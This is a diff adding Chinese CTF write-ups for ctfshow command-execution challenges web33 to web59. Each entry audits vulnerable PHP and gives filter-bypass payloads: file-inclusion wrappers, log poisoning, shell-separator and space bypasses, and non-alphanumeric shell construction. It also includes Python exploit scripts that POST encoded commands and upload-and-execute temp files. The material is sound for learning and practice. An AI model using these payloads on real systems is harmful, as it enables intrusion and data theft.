@@ -8,7 +8,7 @@
 
 ## 3.命令执行
 
-### Web29
+### web29
 
 1. 代码审计下
 
@@ -161,7 +161,1487 @@
    ctfshow{2bf658c1-4a45-4dea-8ecd-6379c4f22abf}
    ```
 
-   ![3](img/image-20210608202154453.png)
+   ![](img/image-20210608202154453.png)
+
+
+
+### web33
+
+1. 代码审计
+
+   ```php
+   <?php
+   error_reporting(0);
+   if(isset($_GET['c'])){
+       $c = $_GET['c'];
+       if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c))
+         //增加了对( "的过滤
+       {
+           eval($c);
+       }
+       
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 利用构造文件包含来执行命令，payload
+
+   ```shell
+   ?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
+   
+   ?c=include$_GET[a]?>&a=data://text/plain,<?php system('tac flag.php');?>
+   
+   ?c=include$_GET[a]?>&a=php://input
+   #POST提交
+   <?php system('tac flag.php');?>
+   ```
+
+
+
+### web34
+
+1. 代码审计
+
+   ```php
+    <?php
+   error_reporting(0);
+   if(isset($_GET['c'])){
+       $c = $_GET['c'];
+       if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c))
+         //增加了:过滤
+       {
+           eval($c);
+       }
+       
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. payload与web33相似
+
+   ```shell
+   ?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
+   
+   ?c=include$_GET[a]?>&a=data://text/plain,<?php system('tac flag.php');?>
+   
+   ?c=include$_GET[a]?>&a=php://input
+   #POST提交
+   <?php system('tac flag.php');?>
+   ```
+
+
+
+### web35
+
+1. 代码审计
+
+   ```php
+    <?php
+   error_reporting(0);
+   if(isset($_GET['c'])){
+       $c = $_GET['c'];
+       if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c))
+         //增加了< =过滤
+       {
+           eval($c);
+       }
+       
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 还是不影响`web33`利用文件包含方法
+
+   ```shell
+   ?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
+   
+   ?c=include$_GET[a]?>&a=data://text/plain,<?php system('tac flag.php');?>
+   
+   ?c=include$_GET[a]?>&a=php://input
+   #POST提交
+   <?php system('tac flag.php');?>
+   ```
+
+   
+
+### web36
+
+1. 代码审计
+
+   ```php
+    <?php
+   error_reporting(0);
+   if(isset($_GET['c'])){
+       $c = $_GET['c'];
+       if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c))
+         //在前面的基础上增加了/ 0-9数字的过滤
+       {
+           eval($c);
+       }
+       
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 但仍然可以用`web33`构造方法
+
+   ```shell
+   ?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
+   
+   ?c=include$_GET[a]?>&a=data://text/plain,<?php system('tac flag.php');?>
+   
+   ?c=include$_GET[a]?>&a=php://input
+   #POST提交
+   <?php system('tac flag.php');?>
+   ```
+
+
+
+### web37
+
+1. 代码审计
+
+   ```php
+    <?php
+   //flag in flag.php
+   error_reporting(0);
+   if(isset($_GET['c'])){
+       $c = $_GET['c'];
+       if(!preg_match("/flag/i", $c))
+         //正则过滤flag
+       {
+           include($c);
+         //文件包含
+           echo $flag;
+       
+       }
+           
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 这里可以利用文件包含的伪协议
+
+   ```shell
+   ?c=data://text/plain,<?php system('tac fl*.php');?>
+   
+   ?c=php://input
+   #POST传递
+   <?php system('tac flag.php');?>
+   ```
+
+3. 还可以利用日志文件进行文件包含，让恶意代码执行
+
+   ```shell
+   #日志文件路径/var/log/nginx/access.log
+   #修改User-agent头部
+   利用burp进行重发包，让构造的恶意代码执行
+   ```
+
+   ![](img/image-20210701131646235.png)
+
+
+
+### web38
+
+1. 代码审计
+
+   ```php
+    <?php
+   //flag in flag.php
+   error_reporting(0);
+   if(isset($_GET['c'])){
+       $c = $_GET['c'];
+       if(!preg_match("/flag|php|file/i", $c))
+         //这里增加了对php,file过滤
+       {
+           include($c);
+           echo $flag;
+       
+       }
+           
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 利用`data`伪协议进行读取，因为同时对`php`进行了过滤，要用`base64`加密
+
+   ```shell
+   <?php system('tac flag*')?>
+   #base64加密后
+   ?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZyonKTs/Pg==
+   
+   #有些执行出来是空白，可以命令后面加入echo 1;试试
+   #例如<?php phpinfo();echo 1;?>
+   ```
+
+
+
+### web39
+
+1. 代码审计
+
+   ```php
+    <?php
+   //flag in flag.php
+   error_reporting(0);
+   if(isset($_GET['c'])){
+       $c = $_GET['c'];
+       if(!preg_match("/flag/i", $c))
+         //这里对flag字符进行过滤
+       {
+           include($c.".php");
+         //在后面添加.php
+       }
+           
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 本来想用`%00`截断，但是php版本太高了，利用`data://伪协议`将php代码进行执行，后面的`?>`刚好闭合完，`.php`就会被当作`.html`输出
+
+   ```shell
+   ?c=data://text/plain,<?php system('tac fla*');?>
+   ```
+
+
+
+
+### web40
+
+1. 代码审计
+
+   ```php
+   <?php
+   if(isset($_GET['c'])){
+       $c = $_GET['c'];
+       if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c))
+         //这里$,:,/...中文括号都进行了过滤
+       {
+           eval($c);
+       }
+           
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 这里肯定不能用常用的方法了，基本都被过滤了，学习一下大佬们的姿势
+   ```
+   #payload:
+   ?c=show_source(next(array_reverse(scandir(pos(localeconv()))))); 
+   ```
+
+3. 先来学习下我们要用的几个函数
+
+   ```php
+   print_r() 函数用于打印变量，以更容易理解的形式展示
+   
+   localeconv()：是一个编程语言函数，返回包含本地数字及货币信息格式的数组。其中数组中的第一个为点号(.)
+   
+   pos()：返回数组中的当前元素的值。这里也可以换成current()，作用和pos类似
+   
+   array_reverse()：数组逆序
+   
+   scandir()：获取目录下的文件
+   
+   next()： 函数将内部指针指向数组中的下一个元素，并输出。
+   ```
+
+3. 通过 `pos(localeconv())`得到点号,因为`scandir('.')`表示得到当前目录下的文件
+
+   ![](img/image-20210704204231095.png)
+
+   ![](img/image-20210704204311604.png)
+
+4. 这里将当前目录读取到后，进行数组逆序`array_reverse`，要得到`flag.php`，需要用`next`将指针指向下一位，即`flag.php`
+
+   ![](img/image-20210704204631031.png)
+
+   ![](img/image-20210704204720955.png)
+
+5. 用`show_source`将代码显示出来
+
+   ![](img/image-20210704204839012.png)
+
+
+
+### web41
+
+1. 代码审计
+
+   ```php
+    <?php
+   if(isset($_POST['c'])){
+       $c = $_POST['c'];
+   if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
+           eval("echo($c);");
+       }
+   }else{
+       highlight_file(__FILE__);
+   }
+   ?> 
+   ```
+
+2. 这里没有过滤`|`可以利用`|`构造出无字母数字命令，这里具体原理不再班门弄斧了，看一下参考文章
+
+3. 这里整理了一份通用脚本，包含了异或，或，取反，自增，先利用`php`将ascii为0-255的字符中，找到能得到我们可用的字符的字符，并生成在`rec.txt`。
+
+   ```php
+   <?php
+   #从字符中过滤被正则过滤的字符，生成能够被我们用的字符串，搭配rec_bypass_exp使用
+   //或
+   function orRce($par1, $par2){
+       $result = (urldecode($par1)|urldecode($par2));
+       return $result;
+   }
+   
+   //异或
+   function xorRce($par1, $par2){
+       $result = (urldecode($par1)^urldecode($par2));
+       return $result;
+   }
+   
+   //取反
+   function negateRce(){
+       fwrite(STDOUT,'[+]your function: ');
+   
+       $system=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN));
+   
+       fwrite(STDOUT,'[+]your command: ');
+   
+       $command=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN));
+   
+       echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';
+   }
+   
+   //自增
+   //测试发现7.0.12以上版本不可使用
+   //使用时需要url编码下
+   //$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
+   //固定格式 构造出来的 assert($_POST[_]);
+   //然后post传入   _=phpinfo();
+   
+   
+   //mode=1代表或，2代表异或，3代表取反
+   //取反的话，就没必要生成字符去跑了，因为本来就是不可见字符，直接绕过正则表达式
+   function generate($mode, $preg='/[0-9]/i'){
+       if ($mode!=3){
+           $myfile = fopen("rce.txt", "w");
+           $contents = "";
+   
+           for ($i=0;$i<256;$i++){
+               for ($j=0;$j<256;$j++){
+                   if ($i<16){
+                       $hex_i = '0'.dechex($i);
+                   }else{
+                       $hex_i = dechex($i);
+                   }
+                   if ($j<16){
+                       $hex_j = '0'.dechex($j);
+                   }else{
+                       $hex_j = dechex($j);
+                   }
+                   if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
+                       echo "";
+                   }else{
+                       $par1 = "%".$hex_i;
+                       $par2 = '%'.$hex_j;
+                       $res = '';
+                       if ($mode==1){
+                           $res = orRce($par1, $par2);
+                       }else if ($mode==2){
+                           $res = xorRce($par1, $par2);
+                       }
+   
+                       if (ord($res)>=32&ord($res)<=126){
+                           $contents=$contents.$res." ".$par1." ".$par2."\n";
+                       }
+                   }
+               }
+   
+           }
+           fwrite($myfile,$contents);
+           fclose($myfile);
+       }else{
+           negateRce();
+       }
+   
+   }
+   //自行更改模式 更改正则匹配
+   generate(1,'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i');
+   ```
+
+4. 访问`php`脚本，会生成我们构造好的可见字符字典，再利用`exp`脚本，需要根据实际情况改一下路径和url
+
+   ```python
+   # -*- coding: utf-8 -*-
+   '''
+   @Time : 2021/7/7 11:00
+   @Author : Seals6
+   @File : rec_bypass_exp.py
+   @blog: seals6.github.io
+   
+   -*- 功能说明 -*-
+   
+   -*- 更新说明 -*-
+   
+   '''
+   import requests
+   import urllib
+   from sys import *
+   import os
+   
+   def action(arg):
+       s1 = ""
+       s2 = ""
+       for i in arg:
+         #路径自行修改
+           f = open("rce.txt", "r")
+           while True:
+               t = f.readline()
+               if t == "":
+                   break
+               if t[0] == i:
+                   # print(i)
+                   s1 += t[2:5]
+                   s2 += t[6:9]
+                   break
+           f.close()
+       #切换输出异或还是或
+       # output = "(\"" + s1 + "\"^\"" + s2 + "\")"
+       output = "(\"" + s1 + "\"|\"" + s2 + "\")"
+       return (output)
+   
+   
+   while True:
+       #根据实际情况构造
+       param = action(input("\n[+] your function：")) + action(input("[+] your command："))
+       print(param)
+   
+       #requests库请求网址，自行决定
+       url=""
+       data = {
+           'c': urllib.parse.unquote(param)
+       }
+       r = requests.post(url, data=data)
+       print("\n[*] result:\n" + r.text)
+   ```
+
+5. 运行输入命令，因为是`POST`，提交需要`url编码`最好利用，`requests`库进行请求，`get`可以输出进行手工提交
+
+   ![](img/image-20210707131800880.png)
+
+
+
+参考文章：
+
+[P神-一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
+
+[羽师傅-无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本](https://blog.csdn.net/miuzzx/article/details/109143413)
+
+### web42
+
+1. 代码审计
+
+   ```php
+    <?php
+   if(isset($_GET['c'])){
+       $c=$_GET['c'];
+       system($c." >/dev/null 2>&1");
+     //标准输出和错误输出都进了黑洞，不会打印到屏幕
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 这里是将标准输入重定向到黑洞，再把标准错误指向标准输入，则标准输出和错误都进黑洞了，不会打印到屏幕上，可以利用`shell`命令分隔即可
+
+   ```php
+   ;	//分号
+   |	//只执行后面那条命令
+   ||	//只执行前面那条命令
+   &	//两条命令都会执行
+   &&	//两条命令都会执行
+   %0a //换行符
+   %0d //回车符
+   ```
+
+   ```shell
+   ?c=tac fla*||
+   ?c=tac fla*;
+   ```
+
+
+
+### web43
+
+1. 代码审计
+
+   ```php
+    <?php
+   if(isset($_GET['c'])){
+       $c=$_GET['c'];
+       if(!preg_match("/\;|cat/i", $c))
+         //这里把; cat进行了过滤
+       {
+           system($c." >/dev/null 2>&1");
+       }
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 这里仅仅只过滤了`;` `cat`进行了过滤，可以替换成其他文件查看的函数
+
+   ```shell
+   more:一页一页的显示档案内容
+   less:与 more 类似
+   head:查看头几行
+   tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
+   tail:查看尾几行
+   nl：显示的时候，顺便输出行号
+   od:以二进制的方式读取档案内容
+   vi:一种编辑器，这个也可以查看
+   vim:一种编辑器，这个也可以查看
+   sort:可以查看
+   uniq:可以查看
+   file -f:报错出具体内容
+   grep
+   strings
+   ```
+
+   ```shell
+   ?c=tac fl*||
+   ?c=nl fl*||
+   ```
+
+
+
+### web44
+
+1. 代码审计
+
+   ```php
+    <?php
+   if(isset($_GET['c'])){
+       $c=$_GET['c'];
+       if(!preg_match("/;|cat|flag/i", $c))
+         //过滤; cat flag
+       {
+           system($c." >/dev/null 2>&1");
+       }
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 按照上一题`web43`的方法，替换`cat`函数，文件名用通配符进行替换
+
+   ```shell
+   ?c=strings fl* ||
+   ?c=tac fl* ||
+   ```
+
+
+
+### web45
+
+1. 代码审计
+
+   ```php
+    <?php
+   if(isset($_GET['c'])){
+       $c=$_GET['c'];
+       if(!preg_match("/\;|cat|flag| /i", $c))
+         //过滤了; cat flag 空格
+       {
+           system($c." >/dev/null 2>&1");
+       }
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 还过滤了空格，要进行空格绕过
+
+   ```shell
+   > < <> 重定向符
+   %09(需要php环境)
+   ${IFS}
+   $IFS$9 #$9指传过来的第9个参数
+   {cat,flag.php} #用逗号实现了空格功能
+   %20
+   ```
+
+   ```shell
+   ?c=tac${IFS}fl*%0a
+   ?c=tac$IFS$9fl*$IFS$9||
+   
+   #%20不行的原因是，get提交时，会自动进行解码成空格，匹配上正则
+   ```
+
+
+
+### web46
+
+1. 代码审计
+
+   ```php
+    <?php
+   if(isset($_GET['c'])){
+       $c=$_GET['c'];
+       if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c))
+         //增加了数字，$,*过滤
+       {
+           system($c." >/dev/null 2>&1");
+       }
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 这里把`$` `*`过滤掉了，那么就不能用`${IFS}`了，这里用`%09`提交后会自动解码为`tap`键，不会被正则匹配上，`*`号被过滤，可以用`?`进行代替
+
+   ```shell
+   ?c=tac%09fla??php||
+   ```
+
+
+
+### web47
+
+1. 代码审计
+
+   ```php
+   <?php
+   if(isset($_GET['c'])){
+       $c=$_GET['c'];
+       if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c))
+         //增加了几个读取文件内容命令进行过滤
+       {
+           system($c." >/dev/null 2>&1");
+       }
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. `Web43`的方法，替换函数即可
+
+   ```shell
+   ?c=tac%09fla?.php||
+   ?c=strings%09fla?.php||
+   ?c=vi%09fla?.php||
+   ?c=nl%09fla?.php||
+   ```
+
+
+
+### web48
+
+1. 代码审计
+
+   ```php
+   <?php
+   if(isset($_GET['c'])){
+       $c=$_GET['c'];
+       if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c))
+         //增加了几个函数
+       {
+           system($c." >/dev/null 2>&1");
+       }
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 可以用`web43`方法，替换没过滤的函数，例如`tac`，这里学习了新姿势
+
+   ```shell
+   ?c=nl<fla''g.php||
+   ?c=tac%09fla?.php||
+   ```
+
+   
+
+### web49
+
+1. 代码审计
+
+   ```php
+    <?php
+   if(isset($_GET['c'])){
+       $c=$_GET['c'];
+       if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c))
+         //增加了反引号，%
+       {
+           system($c." >/dev/null 2>&1");
+       }
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 同`web43`，替换没有过滤的函数
+
+   ```shell
+   ?c=nl<fla''g.php||
+   ?c=tac%09fla?.php||
+   
+   #%09为什么没有被过滤，因为提交时会自动解码为tap键，绕过了过滤
+   ```
+
+
+
+### web50
+
+1. 代码审计
+
+   ```php
+    <?php
+   if(isset($_GET['c'])){
+       $c=$_GET['c'];
+       if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c))
+         //这里增加了过滤%09 &符号
+       {
+           system($c." >/dev/null 2>&1");
+       }
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 因为过滤了`%09`，就不能绕过空格了，这里用`nl`进行读取
+
+   ```shell
+   ?c=nl<fla''g.php||
+   
+   #nl<flag?php||这样写不行，因为重定向不支持通配符，单引号分隔是Linux的一个特性，执行时会自动忽略单引号
+   ```
+
+
+
+### web51
+
+1. 代码审计
+
+   ```php
+    <?php
+   if(isset($_GET['c'])){
+       $c=$_GET['c'];
+       if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c))
+         //这里把tac过滤了
+       {
+           system($c." >/dev/null 2>&1");
+       }
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 用`nl`进行替换，同`web51`
+
+   ```shell
+   ?c=nl<fl''ag.php||
+   ```
+
+
+
+### web52
+
+1. 代码审计
+
+   ```php
+   <?php
+   if(isset($_GET['c'])){
+       $c=$_GET['c'];
+       if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c))
+         //增加了<>的过滤
+       {
+           system($c." >/dev/null 2>&1");
+       }
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 增加了`<` `>`的过滤，但是没有对`$`过滤，可以利用`${IFS}`进行绕过空格，发现是假的`flag`，那么应该在根目录了
+
+   ```shell
+   ?c=nl${IFS}fla?.php||
+   ?c=nl${IFS}fla\g.php%0a
+   ```
+
+   ![](img/image-20210705165156050.png)
+
+3. 查看下根目录
+
+   ```shell
+   ?c=ls${IFS}/||
+   ```
+
+   ![](img/image-20210705165327167.png)
+
+4. 查看flag
+
+   ```shell
+   ?c=nl${IFS}/fla?||
+   ```
+
+
+
+### web53
+
+1. 代码审计
+
+   ```php
+   <?php
+   if(isset($_GET['c'])){
+       $c=$_GET['c'];
+       if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
+           echo($c);
+           $d = system($c);
+           echo "<br>".$d;
+       }else{
+           echo 'no';
+       }
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 仔细看下，`$`没过滤，`nl`没过滤，还不会重定向了
+
+   ```shell
+   ?c=nl${IFS}fla?.php
+   ?c=ta''c${IFS}fl''ag.php
+   
+   #新姿势，利用\进行绕过
+   ?c=ta\c${IFS}fl\ag.php
+   ```
+
+
+
+### web54
+
+1. 代码审计
+
+   ```php
+    <?php
+   if(isset($_GET['c'])){
+       $c=$_GET['c'];
+       if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c))
+       //这里对大部分函数，分号，空格，数字，*，%，tap键，&，`进行了过滤，并且函数内部无论写什么都会被正则匹配上
+       {
+           system($c);
+       }
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 考虑没有过滤的函数例如`vi` `grep`，再对空格进行绕过
+
+   ```shell
+   ?c=vi${IFS}fla?.php
+   
+   #利用grep，将文件中包含{的一行输出出来，等于grep { flag.php命令
+   ?c=grep${IFS}{${IFS}fla?.php
+   ```
+
+
+
+### web55
+
+1. 代码审计
+
+   ```php
+   <?php
+   // 你们在炫技吗？
+   if(isset($_GET['c'])){
+       $c=$_GET['c'];
+       if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c))
+         //过滤了字母 ; ` % %09 &号
+       {
+           system($c);
+       }
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 这里把字母过滤了，但是数字没有被过滤，所以要构造无文字的命令，这里参考了几篇文章，有几种办法。
+
+3. 第一种利用`linux`环境下，`/bin`目录有系统常用命令，例如:cat、cp、chmod、df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等，可以直接利用通配符进行调用
+
+   ```shell
+   #没有过滤数字，可以用base64进行编码
+   ?c=/???/????64 ????.???
+   ```
+
+   ![](img/image-20210706103253584.png)
+
+4. 第二种是制作无字母数字的命令，在`php`中，如果我们进行上传文件，会通常在服务器端保存为`/tmp/phpxxxxxx`的形式，有条件竞争异曲同工之妙，文件名最后的6个字符是随机的大小写字母，而且最后一个字符大概率是大写字母。容易想到的匹配方式就是利用`？`进行匹配，即`/???/?????????`，然而因为`/tmp`目录下还有很多文件也也符合条件，也会被匹配上。但是最后一个字符大概率是大写字母，观察`ascii`表可以发现，在大写字母A的前一个符号为`@`，大写字母Z的后一个字母为`[`，因此我们可以使用`[@-[]`来表示匹配大写字母，也就是变成了这样的形式：`/???/????????[@-[]`，到这一步已经能匹配到了我们上传的文件。如何执行呢，`linux`系统中可以用`.`进行执行，相当于`source` 可以执行sh命令。具体命令的原理可以看后面的参考文章。
+
+5. 我们要先制作一个`post上传文件表单`
+
+   ```html
+   <!DOCTYPE html>
+   <html lang="en">
+   <head>
+       <meta charset="UTF-8">
+       <title>upload</title>
+   </head>
+   <body>
+   <form action="http://xxxxxxx.challenge.ctf.show:8080/" method="post" enctype="multipart/form-data">
+     <!-- 地址就写服务器的地址-->
+       <input type="file" name="file" id="file"><br>
+       <input type="submit" name="submit" value="提交">
+   </form>
+   </body>
+   </html>
+   ```
+
+6. 抓包上传文件，构造`POC`
+
+   ![](img/image-20210706104958620.png)
+
+7. 修改`shell`命令查看`flag`
+
+   ![](img/image-20210706105244732.png)
+
+参考文章:
+
+[P神-无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
+
+[Firebasky-无字母数字命令执行](https://blog.csdn.net/qq_46091464/article/details/108513145)
+
+[LINUX中的点命令，或source命令，或点符号](http://blog.sina.com.cn/s/blog_af68a2c201016nh2.html)
+
+
+
+### web56
+
+1. 代码审计
+
+   ```php
+    <?php
+   // 你们在炫技吗？
+   if(isset($_GET['c'])){
+       $c=$_GET['c'];
+       if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c))
+         //这里把数字也过滤掉了
+       {
+           system($c);
+       }
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 这里要用到`web56`的第二种方法，无字母数字命令执行，同理可以用上一题制作文件上传，抓包利用`.`进行执行`shell`命令，这里下面用`python`的`requests`库进行请求，有可能临时文件最后一位不是大写,所以匹配不到，需要重复发包几次
+
+   ```python
+   # -*- coding: utf-8 -*-
+   '''
+   @Time : 2021/7/6 11:12
+   @Author : Seals6
+   @File : upload-ctfshow.py
+   @contact: 972480239@qq.com
+   @blog: seals6.github.io
+   
+   -*- 功能说明 -*-
+   
+   -*- 更新说明 -*-
+   
+   '''
+   import requests
+   url="http://xxxxxxxxxxxx.challenge.ctf.show:8080/"
+   params={"c":". /???/????????[@-[]"}
+   r=requests.post(url=url,params=params,files={"file":("1.php","cat flag.php")})
+   print(r.text)
+   ```
+
+   ![](img/image-20210706114447361.png)
+
+
+
+### web57
+
+1. 代码审计
+
+   ```php
+   // 还能炫的动吗？
+   //flag in 36.php
+   if(isset($_GET['c'])){
+       $c=$_GET['c'];
+       if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c))
+         //这里把数字，字母，通配符，点号都过滤了
+       {
+           system("cat ".$c.".php");
+         //这里只要构造出36就可以了
+       }
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 基本都过滤了，但是提示`flag in 36.php`，并且`system(cat .php)`所以只要构造出36就可以了，参考了大佬的文章，`linux`中可以使用`$(())`参与运算，刚好这三个符号没有被过滤掉。
+
+   >`$(())` 代表做一次运算，因为里面为空，也表示值为0
+   >`$((~$(())))` 对0作取反运算，值为-1
+   >`$(($((~$(())))$((~$(())))))` -1-1，也就是(-1)+(-1)为-2，所以值为-2
+   >`$((~$(($((~$(())))$((~$(())))))))` 再对-2做一次取反得到1，所以值为1
+   >
+   >如果对取反不了解可以看一下原码，补码，反码，这里给个容易记得式子，如果对a按位取反，则得到结果为-(a+1)，也就是对0取反得到-1
+   
+   ![](img/image-20210706151436106.png)
+   
+3. 我们利用脚本进行构造
+
+   ```python
+   shell="$(("+"~$(("+"$((~$(())))"*37+"))))"
+   print(shell)
+   ```
+
+   ![](img/image-20210706151629175.png)
+
+   ```shell
+   #payload
+   $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
+   ```
+
+   
+
+### web58
+
+1. 代码审计
+
+   ```php
+   <?php
+   // 你们在炫技吗？
+   if(isset($_POST['c'])){
+           $c= $_POST['c'];
+           eval($c);
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. `eval`函数，应该可以直接连上工具读取，但是好像是考读取文件函数，因为禁用了命令执行函数，不能用`cat` `tac`了，使用读取文件函数进行读取flag
+
+   ```php
+   highlight_file($filename);
+   show_source($filename);
+   print_r(php_strip_whitespace($filename));
+   print_r(file_get_contents($filename));
+   readfile($filename);
+   print_r(file($filename)); // var_dump
+   fread(fopen($filename,"r"), $size);
+   include($filename); // 非php代码
+   include_once($filename); // 非php代码
+   require($filename); // 非php代码
+   require_once($filename); // 非php代码
+   print_r(fread(popen("cat flag", "r"), $size));
+   print_r(fgets(fopen($filename, "r"))); // 读取一行
+   fpassthru(fopen($filename, "r")); // 从当前位置一直读取到 EOF
+   print_r(fgetcsv(fopen($filename,"r"), $size));
+   print_r(fgetss(fopen($filename, "r"))); // 从文件指针中读取一行并过滤掉 HTML 标记
+   print_r(fscanf(fopen("flag", "r"),"%s"));
+   print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组
+   ```
+
+
+
+### web59
+
+1. 代码审计
+
+   ```php
+   <?php
+   // 你们在炫技吗？
+   if(isset($_POST['c'])){
+           $c= $_POST['c'];
+           eval($c);
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 应该禁用了一些函数，测试可以用的payload
+
+   ```shell
+   c=show_source("flag.php");
+   c=highlight_file("flag.php");
